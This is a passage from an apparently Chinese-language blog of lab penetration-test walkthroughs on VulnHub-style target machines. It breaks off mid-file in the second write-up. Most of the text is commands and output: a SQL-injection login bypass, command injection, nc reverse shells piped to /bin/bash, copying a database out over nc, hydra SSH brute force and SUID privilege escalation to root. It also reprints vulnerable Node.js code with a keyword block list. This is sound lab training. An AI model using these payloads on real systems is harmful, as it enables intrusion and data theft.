<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS recon]$ sudo .<span class="regexp">/fscan_darwin -h 192.168.0.0/</span><span class="number">24</span></span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> <span class="regexp">/ /</span>_\<span class="regexp">/____/</span> __|<span class="regexp">/ __| &#x27;__/</span> _` |<span class="regexp">/ __| |/</span> /</span><br><span class="line"><span class="regexp">/ /</span>_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____<span class="regexp">/     |___/</span>\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: <span class="number">1.6</span>.<span class="number">3</span></span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target <span class="string">&#x27;192.168.0.101&#x27;</span> is alive</span><br><span class="line">(icmp) Target <span class="string">&#x27;192.168.0.103&#x27;</span> is alive</span><br><span class="line">(icmp) Target <span class="string">&#x27;192.168.0.1&#x27;</span> is alive</span><br><span class="line">(icmp) Target <span class="string">&#x27;192.168.0.100&#x27;</span> is alive</span><br><span class="line">(icmp) Target <span class="string">&#x27;192.168.0.102&#x27;</span> is alive</span><br><span class="line">icmp alive hosts len is: <span class="number">5</span></span><br><span class="line"><span class="number">192.168</span>.<span class="number">0.103</span>:<span class="number">8080</span> open</span><br><span class="line"><span class="number">192.168</span>.<span class="number">0.103</span>:<span class="number">22</span> open</span><br><span class="line"><span class="number">192.168</span>.<span class="number">0.1</span>:<span class="number">80</span> open</span><br><span class="line">alive ports len is: <span class="number">3</span></span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.103</span>:<span class="number">8080</span> code:<span class="number">200</span> len:<span class="number">327</span>    title:None</span><br></pre></td></tr></table></figure>

<p>192.168.0.103开放了22端口和8080端口，这就是我们的靶机了</p>
<h2 id="3-web入侵"><a href="#3-web入侵" class="headerlink" title="3. web入侵"></a>3. web入侵</h2><p>访问<a href="http://192.168.0.103:8080/">http://192.168.0.103:8080</a></p>
<p>输入框要求我们输入账号密码，要绕过的话有两种方式，sql注入或者爆破</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/1.jpg"> </p>
<h3 id="3-1-SQL注入"><a href="#3-1-SQL注入" class="headerlink" title="3.1 SQL注入"></a>3.1 SQL注入</h3><p>使用特殊字符fuzz，发现<code>&quot;</code>导致异常，排查</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/2.jpg"></p>
<p>很明显将<code>&quot;</code>拼接进了sql语句</p>
<p>那么构造<code>aa&quot; or 1=1--+</code>万能密码就登场成功了</p>
<img src="../images/pics/打靶/3.jpg" style="zoom:50%;" /> 

<p>这是一个杀毒扫描程序，选择文件进行扫描。</p>
<p>猜测服务器上执行的是<code>xxAVscan xxxfile</code>，那么也许我们可以使用<code>|</code>进行命令拼接从而执行命令</p>
<h3 id="3-2-命令注入"><a href="#3-2-命令注入" class="headerlink" title="3.2 命令注入"></a>3.2 命令注入</h3><img src="../images/pics/打靶/4.jpg" style="zoom:50%;" /> 

<p>拼接命令执行，结果如下</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">uid</span>=1001(scanner) <span class="attribute">gid</span>=1001(scanner) <span class="attribute">groups</span>=1001(scanner)</span><br></pre></td></tr></table></figure>

<p>既然可以执行命令我们就可以反弹shell</p>
<h2 id="4-远程控制"><a href="#4-远程控制" class="headerlink" title="4. 远程控制"></a>4. 远程控制</h2><p>上面我们已经看到有netcat，尝试使用nc反弹shell，查看位置</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">netcat | which nc</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="regexp">/bin/</span>nc</span><br></pre></td></tr></table></figure>

<p>使用nc反弹shell</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试poc</span></span><br><span class="line"><span class="attribute">netcat</span> | nc <span class="number">192.168.0.10</span> <span class="number">4444</span> -e /bin/sh</span><br></pre></td></tr></table></figure>

<p>上述没有收到shell，因为<u>有的nc版本没有-e参数</u></p>
<p>直接使用nc连接证明是否存在nc</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">netcat</span> | nc <span class="number">192.168.0.10</span> <span class="number">4444</span></span><br><span class="line"><span class="comment">#结果确实收到了nc连接</span></span><br></pre></td></tr></table></figure>

<p><strong>使用nc串联</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#kali监听两个端口,一个作为输入，一个作为接收，3333输入，4444接收</span></span><br><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">3333</span></span><br><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#poc</span></span><br><span class="line"><span class="attribute">netcat</span> | nc <span class="number">192.168.0.10</span> <span class="number">3333</span> | /bin/bash | nc <span class="number">192.168.0.10</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>现在我们在3333端口执行命令，执行结果会在4444端口显示。</p>
<p>现在我们完成了远程控制</p>
<h2 id="5-信息收集"><a href="#5-信息收集" class="headerlink" title="5. 信息收集"></a>5. 信息收集</h2><p>执行ls命令，发现如下几个文件</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">app.py</span><br><span class="line"><span class="keyword">database</span>.<span class="keyword">sql</span></span><br><span class="line">samples</span><br><span class="line">templates</span><br></pre></td></tr></table></figure>

<p><strong>获取sqlite文件</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#kali接收数据</span></span><br><span class="line"><span class="attribute">nc</span> -lnvlp <span class="number">5555</span> &gt; db.sql</span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机执行</span></span><br><span class="line"><span class="attribute">nc</span> <span class="number">192.168.0.10</span> <span class="number">5555</span> &lt; database.sql</span><br></pre></td></tr></table></figure>

<p>这种方式获取到文件后是没有提示的</p>
<p><strong>在kali 机器上读取sqlite文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入sqlite</span></span><br><span class="line">[root@kali ~]# sqlite3                                                                                                                 127 ⨯</span><br><span class="line">SQLite version 3.34.1 2021-01-20 14:10:07</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line">Connected to a transient in-memory database.</span><br><span class="line">Use &quot;.open FILENAME&quot; to reopen on a persistent database.</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">打开db.sql</span></span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> .open db.sql</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查看数据库路径</span></span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> .database</span></span><br><span class="line">main: /root/db.sql r/w</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查看内容</span></span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> .dump</span></span><br><span class="line">PRAGMA foreign_keys=OFF;</span><br><span class="line">BEGIN TRANSACTION;</span><br><span class="line">CREATE TABLE `code` (</span><br><span class="line">	`password`	TEXT</span><br><span class="line">);</span><br><span class="line">INSERT INTO code VALUES(&#x27;myinvitecode123&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;mysecondinvitecode&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;cloudavtech&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;mostsecurescanner&#x27;);</span><br><span class="line">COMMIT;</span><br><span class="line"><span class="meta">sqlite&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现有几个密码</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">myinvitecode123</span><br><span class="line">mysecondinvitecode</span><br><span class="line"><span class="keyword">cloudavtech</span></span><br><span class="line"><span class="keyword"></span>mostsecurescanner</span><br></pre></td></tr></table></figure>



<h2 id="6-爆破账号"><a href="#6-爆破账号" class="headerlink" title="6. 爆破账号"></a>6. 爆破账号</h2><p>已经有了账号，现在获取可以登录的用户</p>
<p>执行命令</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>passwd | <span class="keyword">grep</span> <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span>0<span class="symbol">:</span>0<span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">cloudav:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:cloudav</span><span class="symbol">:/home/cloudav</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">scanner:</span><span class="symbol">x:</span><span class="number">1001</span><span class="symbol">:</span><span class="number">1001</span><span class="symbol">:scanner</span>,,,<span class="symbol">:/home/scanner</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>构造字典如下</p>
<p>user.txt</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">root</span></span><br><span class="line"><span class="attribute">cloudav</span></span><br><span class="line"><span class="attribute">scanner</span></span><br></pre></td></tr></table></figure>

<p>pass.txt</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">myinvitecode123</span><br><span class="line">mysecondinvitecode</span><br><span class="line"><span class="keyword">cloudavtech</span></span><br><span class="line"><span class="keyword"></span>mostsecurescanner</span><br></pre></td></tr></table></figure>

<p>爆破ssh服务</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">hydra -L user<span class="selector-class">.txt</span> -P pass<span class="selector-class">.txt</span> ssh:<span class="comment">//192.168.0.103</span></span><br></pre></td></tr></table></figure>

<p>爆破失败</p>
<h2 id="7-suid提权"><a href="#7-suid提权" class="headerlink" title="7. suid提权"></a>7. suid提权</h2><p>查看suid的二进制文件</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span> </span><br></pre></td></tr></table></figure>

<p>结果是没有常见的提权的可执行程序的，但是有一个文件值得注意</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/home/</span>scanner/update_cloudav</span><br></pre></td></tr></table></figure>

<p>于是我们看一下scanner目录</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ls -l <span class="regexp">/home/</span>scanner/</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">drwxrwxr-x<span class="number"> 4 </span>scanner scanner<span class="number"> 4096 </span>Oct<span class="number"> 24 </span><span class="number"> 2018 </span>cloudav_app</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root    scanner<span class="number"> 8576 </span>Oct<span class="number"> 24 </span><span class="number"> 2018 </span>update_cloudav</span><br><span class="line">-rw-rw-r--<span class="number"> 1 </span>scanner scanner <span class="number"> 393 </span>Oct<span class="number"> 24 </span><span class="number"> 2018 </span>update_cloudav.c</span><br></pre></td></tr></table></figure>

<p>发现update_cloudav的源码，审计一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *freshclam=<span class="string">&quot;/usr/bin/freshclam&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *command = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(freshclam) + <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">2</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;%s %s&quot;</span>, freshclam, argv[<span class="number">1</span>]);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(command);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该程序调用了freshclam，并且可以指定一个参数，那么我们将参数设置为反弹shell的命令或许可以成功</p>
<p>执行如下命令，执行前kali再监听两个端口</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/home/</span>scanner<span class="regexp">/update_cloudav &quot;a|nc 192.168.0.10 6666 | /</span>bin/bash | nc <span class="number">192.168</span>.<span class="number">0.10</span> <span class="number">7777</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>收到shell</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root),1001(scanner)</span><br></pre></td></tr></table></figure>

<p>至此打靶结束</p>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>打靶练习3-Chronos</title>
    <url>/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A03-Chronos/</url>
    <content><![CDATA[<p>netdiscover | nmap | TxPortMap | 本地域名绑定| CyberChef Magic | nc串联 | nodejs代码审计 | express fileupload原型链污染漏洞 | sudo node shell提权</p>
<span id="more"></span>

<p>靶机地址：<a href="https://www.vulnhub.com/entry/chronos-1,735/">https://www.vulnhub.com/entry/chronos-1,735/</a></p>
<h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1. 主机发现"></a>1. 主机发现</h2><p>使用netdiscover通过arp地址进行主机发现</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover -r 172.16.42.0/16</span><br></pre></td></tr></table></figure>

<p><code>使用经验，如果实际网段是24位减8，16也减8，这样速率高一些，效果好一些</code></p>
<p>扫描结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">172.16.42.203   08:00:27:68:58:18     24    1440  PCS Systemtechnik GmbH</span><br><span class="line"> 172.16.42.1     00:50:56:c0:00:08      1      60  VMware, Inc.</span><br><span class="line"> 172.16.42.254   00:50:56:fd:c7:e1      1      60  VMware, Inc</span><br></pre></td></tr></table></figure>

<p>明显172.16.42.203就是目标靶机，</p>
<h2 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2. 端口扫描"></a>2. 端口扫描</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>全端口扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -p- 172.16.42.203</span><br></pre></td></tr></table></figure>

<p>服务识别</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">22</span>/tcp   open  ssh     OpenSSH <span class="number">7</span>.<span class="number">6</span>p<span class="number">1</span> Ubuntu <span class="number">4</span>ubuntu<span class="number">0</span>.<span class="number">5</span> (Ubuntu Linux; protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"><span class="attribute">80</span>/tcp   open  http    Apache httpd <span class="number">2</span>.<span class="number">4</span>.<span class="number">29</span> ((Ubuntu))</span><br><span class="line"><span class="attribute">8000</span>/tcp open  http    Node.js Express framework</span><br></pre></td></tr></table></figure>





<h3 id="TxPortMap"><a href="#TxPortMap" class="headerlink" title="TxPortMap"></a>TxPortMap</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">./TxPortMap_linux_x64 -<span class="selector-tag">i</span> <span class="number">172.16</span>.<span class="number">42.203</span> -<span class="selector-tag">p</span> <span class="number">1</span>-<span class="number">65535</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@kali TxPortMap]# ./TxPortMap_linux_x64 -i 172.16.42.203 1-65535</span><br><span class="line">172.16.42.203:22     ssh | SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.5</span><br><span class="line">172.16.42.203:80     http | [200] [Apache/2.4.29 (Ubuntu)]</span><br><span class="line">172.16.42.203:8000   http | [200] [Express]</span><br></pre></td></tr></table></figure>



<h2 id="3-web入侵"><a href="#3-web入侵" class="headerlink" title="3. web入侵"></a>3. web入侵</h2><p>访问 <a href="http://172.16.42.203/">http://172.16.42.203/</a></p>
<p>查看源码，发现一段js的代码，将其复制到CyberChef将其美化</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/5.jpg"></p>
<p>发现一段url : <a href="http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</a></p>
<p>该url对应8000端口，对应的我们之前扫的端口8000也是开放的，所有，有理由相信chronos.local就是172.16.42.203的域名。</p>
<h3 id="本地域名绑定"><a href="#本地域名绑定" class="headerlink" title="本地域名绑定"></a>本地域名绑定</h3><p>sudo vim /etc/hosts</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/6.jpg"> </p>
<p>这时候ping一下域名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]$ ping chronos.local</span><br><span class="line">PING chronos.local (172.16.42.203): 56 data bytes</span><br><span class="line">64 bytes from 172.16.42.203: icmp_seq=0 ttl=64 time=0.530 ms</span><br><span class="line">64 bytes from 172.16.42.203: icmp_seq=1 ttl=64 time=0.257 ms</span><br><span class="line">64 bytes from 172.16.42.203: icmp_seq=2 ttl=64 time=0.423 ms</span><br><span class="line">64 bytes from 172.16.42.203: icmp_seq=3 ttl=64 time=0.367 m</span><br></pre></td></tr></table></figure>

<p>成功ping通，</p>
<p>再次访问url，发现成功加载了上诉url内容。</p>
<h3 id="CyberChef-Magic"><a href="#CyberChef-Magic" class="headerlink" title="CyberChef Magic"></a>CyberChef Magic</h3><p>burp访问 <a href="http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL%EF%BC%8C%E8%BF%94%E5%9B%9E%E6%97%A5%E6%9C%9F%EF%BC%8C%E4%BF%AE%E6%94%B9%E7%BC%96%E7%A0%81%EF%BC%8C%E5%8F%91%E7%8E%B0%E4%B8%8D%E4%BC%9A%E8%BF%94%E5%9B%9E%E6%97%A5%E6%9C%9F%EF%BC%8C%E4%BD%BF%E7%94%A8CyberChef">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL，返回日期，修改编码，发现不会返回日期，使用CyberChef</a> 的Magic功能识别一下</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/7.jpg"> </p>
<p>magic判读是对<code>&#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;</code>进行base58编码得到。</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p><code>&#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39; </code>这段格式有点像linux的date命令，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@kali ~]# date</span><br><span class="line">Tue Nov  8 02:43:18 AM EST 2022</span><br><span class="line">[root@kali ~]# date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br><span class="line">Today is Tuesday, November 08, 2022 02:43:22.</span><br></pre></td></tr></table></figure>

<p>猜测用命令拼接</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is <span class="built_in">%A</span>, <span class="built_in">%B</span> <span class="built_in">%d</span>, <span class="built_in">%Y</span> <span class="built_in">%H</span>:<span class="built_in">%M</span>:<span class="built_in">%S</span>.&#x27; &amp;&amp; ls</span><br></pre></td></tr></table></figure>



<p><img src="../images/pics/%E6%89%93%E9%9D%B6/8.jpg"> </p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/9.jpg"> </p>
<p>成功执行了命令</p>
<h3 id="nc-bash反弹"><a href="#nc-bash反弹" class="headerlink" title="nc bash反弹"></a>nc bash反弹</h3><p>查看bin目录有没有nc</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">&amp;&amp;<span class="keyword">ls</span> <span class="string">/bin</span></span><br><span class="line">VAZYW9RHPu6D</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>目标存在</p>
<p>使用nc连接</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">&amp;&amp;nc 10.0.0.27 4444</span></span><br></pre></td></tr></table></figure>

<p>连接成功，接下来反弹shell</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc <span class="number">172.16</span>.<span class="number">42.147</span> <span class="number">4444</span> -e <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>

<p>发现不成功，那么nc没有-e命令</p>
<h3 id="nc串联"><a href="#nc串联" class="headerlink" title="nc串联"></a>nc串联</h3><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc <span class="number">172.16</span><span class="number">.42</span><span class="number">.147</span> <span class="number">4444</span> | <span class="regexp">/bin/</span>bash | nc <span class="number">172.16</span><span class="number">.42</span><span class="number">.147</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure>

<p>kali监听两个端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -nvlp <span class="number">4444</span></span><br><span class="line"><span class="attribute">nc</span> -nvlp <span class="number">5555</span></span><br></pre></td></tr></table></figure>

<p>将上诉命令编码后发送，我们就可以在4444端口执行命令，在5555端口查看结果</p>
<h2 id="4-尝试提权"><a href="#4-尝试提权" class="headerlink" title="4. 尝试提权"></a>4. 尝试提权</h2><p>cat /etc/passwd，发现如下账号</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">imera:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:imera</span><span class="symbol">:/home/imera</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>进入 /home/imera，发现user.txt，</p>
<p>尝试读取不成功，查看权限</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">-rw-------<span class="number"> 1 </span>imera imera<span class="number"> 37 </span>Aug <span class="number"> 3 </span><span class="number"> 2021 </span>user.txt</span><br></pre></td></tr></table></figure>

<p>尝试suid提权，没有发现可利用的</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span> </span><br></pre></td></tr></table></figure>

<p>尝试sudo提权，无可利用</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>





<h2 id="5-nodejs代码审计"><a href="#5-nodejs代码审计" class="headerlink" title="5. nodejs代码审计"></a>5. nodejs代码审计</h2><p>进入/opt/chronos目录，查看代码</p>
<p>package.json</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;bs58&quot;</span>: <span class="string">&quot;^4.0.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;cors&quot;</span>: <span class="string">&quot;^2.8.5&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;^4.17.1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>app.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(cors());</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    res.sendFile(<span class="string">&quot;/var/www/html/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> format = req.query.format;</span><br><span class="line">    <span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">    <span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">    <span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">    <span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            res.send(<span class="string">&quot;Something went wrong&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(stdout);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        res.send(<span class="string">&quot;Permission Denied&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(port,<span class="function">() =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>进入/opt/chronos-v2/backend</p>
<p>server.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&quot;express-fileupload&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&quot;/opt/chronos-v2/frontend/pages&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   res.render(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span 